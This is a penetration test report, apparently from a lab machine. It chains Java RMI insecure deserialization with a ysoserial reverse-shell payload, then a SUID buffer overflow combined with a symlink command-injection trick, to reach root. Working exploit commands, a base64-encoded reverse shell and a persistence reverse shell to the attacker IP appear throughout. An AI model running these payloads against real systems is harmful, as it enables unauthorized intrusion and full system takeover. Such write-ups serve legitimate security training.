Pentest Report Linux

RPC1 Machine

Target IP: 192.168.236.236
Attacker IP: 192.168.45.173
Date: 25.01.2026

1. Executive Summary

This report documents the penetration testing activities performed on the target system with IP address 192.168.236.236. During the testing process, Initial Access was achieved by exploiting a configuration error (Insecure Deserialization) in the Java RMI service. Subsequently, Privilege Escalation to ROOT was achieved by chaining a memory management error (Buffer Overflow) and a logic flaw in a custom SUID file found on the system.

2. Information Gathering (Reconnaissance)

Comprehensive scans were performed using the Nmap tool to determine the attack surface on the target system.

2.1. Port Scanning

All TCP ports (1-65535) were scanned to identify open services.

josh@csec:~$ nmap -p- -sS -Pn -oN all_ports 192.168.236.236
[Screenshot 1: Nmap Full Port Scan Results]

2.2. Service Enumeration

Version and script scanning was performed on the identified ports.

josh@csec:~$ nmap -sCVS -p 22,1099,35742 -oN services
  • 22/tcp (SSH): OpenSSH service.
  • 1099/tcp (Java RMI Registry): Java Remote Method Invocation service.
  • 35742/tcp (Java RMI): Dynamic RMI port.

3. Vulnerability Analysis & Initial Access

The Remote-Method-Guesser (rmg) tool was used to determine if the Java RMI service (Port 1099) was vulnerable to "Insecure Deserialization" attacks.

3.1. RMI Enumeration & Method Guessing

josh@csec:~$ rmg enum 192.168.236.236 1099 josh@csec:~$ rmg guess 192.168.236.236 1099

Finding: A method named logMessage(int dummy1, Object dummy2) was discovered. The fact that the method accepts an Object type parameter indicates that malicious serialized objects (payloads) can be sent to the system using ysoserial.

[Screenshot 2: RMG Enum and Guess Output]

3.2. Exploitation

The CommonsCollections6 gadget chain was used to execute an attack to establish a reverse connection (reverse shell) to the system.

Payload (Base64 Encoded): bash -i >& /dev/tcp/192.168.45.173/4444 0>&1
josh@csec:~$ rmg serial 192.168.236.236 1099 CommonsCollections6 \ 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3My80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' \ --bound-name MessengerService \ --signature "int logMessage(int dummy1, Object dummy2)" \ --yso /opt/ysoserial.jar --position 1 --stack-trace
[Screenshot 3: Gaining Reverse Shell]

Result: Access to the system was gained as the rmi-runner user on the attacker machine (nc -nvlp 4444).

4. Privilege Escalation

4.1. SUID File Detection

Files running with root privileges (SUID bit active) were scanned.

rmi-runner@rpc1:~$ find / -perm -4000 -type f 2>/dev/null /usr/bin/rmi-manage <-- [Target]
[Screenshot 4: SUID Enumeration]

4.2. Static Analysis

The file was downloaded to the attacker machine and analyzed with Ghidra. The following critical structures were discovered in the main function.


// local_18 variable holds the program name (argv[0]).
local_18 = (char *)*param_2; 
// ...
gets(uinput.3023); // VULN 1: Unbounded input reading (Buffer Overflow)
// ...
(*f_ptr.3025)(local_18); // VULN 2: argv[0] is called via function pointer.
[Screenshot 5: Ghidra Decompiler Output]

4.3. Dynamic Analysis & Memory Mapping

Since the file has PIE (Position Independent Executable) protection, it was understood that addresses are determined at runtime. Although ASLR is disabled, live analysis was performed on the target system to determine the Base Address.

# 1. Creating the test copy rmi-runner@rpc1:/tmp$ cp /usr/bin/rmi-manage /tmp/rmi-test rmi-runner@rpc1:/tmp$ chmod +x /tmp/rmi-test # 2. Suspending the program and PID detection rmi-runner@rpc1:/tmp$ tail -f /dev/null | /tmp/rmi-test -i >/dev/null 2>&1 & [1] 3384 rmi-runner@rpc1:/tmp$ PID=$! rmi-runner@rpc1:/tmp$ echo "PID: $PID" PID: 3384 # 3. Reading the "Executable" (r-xp) segment from memory map rmi-runner@rpc1:/tmp$ grep "r-xp" /proc/$PID/maps | head -n 1 555555555000-555555556000 r-xp 00001000 fd:00 1774 /tmp/rmi-test # 4. Cleanup rmi-runner@rpc1:/tmp$ kill $PID rmi-runner@rpc1:/tmp$ killall tail

Address Calculation:

  • Loaded Segment: 0x555555555000
  • Segment Offset: 0x1000
  • Base Address: 0x555555555000 - 0x1000 = 0x555555554000
  • System Offset: 0x1110 (Objdump)
  • Target Address: 0x555555554000 + 0x1110 = 0x555555555110

4.4. Exploit Development & Attack

The attack consists of two stages: Symbolic Link Attack (Manipulating the filename) and Buffer Overflow (Redirecting the function pointer to the system address).

1. Payload Creation (Kali)

josh@csec:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"0" + b"A"*15 + b"\x10\x51\x55\x55\x55\x55\x00\x00" + b"\n")' > exploit.bin

2. Symbolic Link (Target)

rmi-runner@rpc1:/tmp$ ln -s /usr/bin/rmi-manage "t;sh"

3. Final Attack

rmi-runner@rpc1:/tmp$ (cat exploit.bin; cat) | ./t\;sh -i Schedule <./t;sh> in ? minutes: sh: 1: ./t: not found id uid=0(root) gid=0(root) groups=0(root)
[Screenshot 6: Obtaining Root Shell]

Persistence: A stable connection was established via the root shell:

bash -i >& /dev/tcp/192.168.45.173/3333 0>&1

5. Conclusion

As a result of the tests performed on the target system; full control of the system (Root access) was seized by chaining the input validation deficiency in the Java RMI service and critical memory/logic errors in the /usr/bin/rmi-manage SUID file.

  • Java RMI service is open to insecure deserialization operations.
  • Buffer Overflow exists in the rmi-manage application due to the use of gets().
  • Insecure use of function pointers and program arguments allows for privilege escalation.
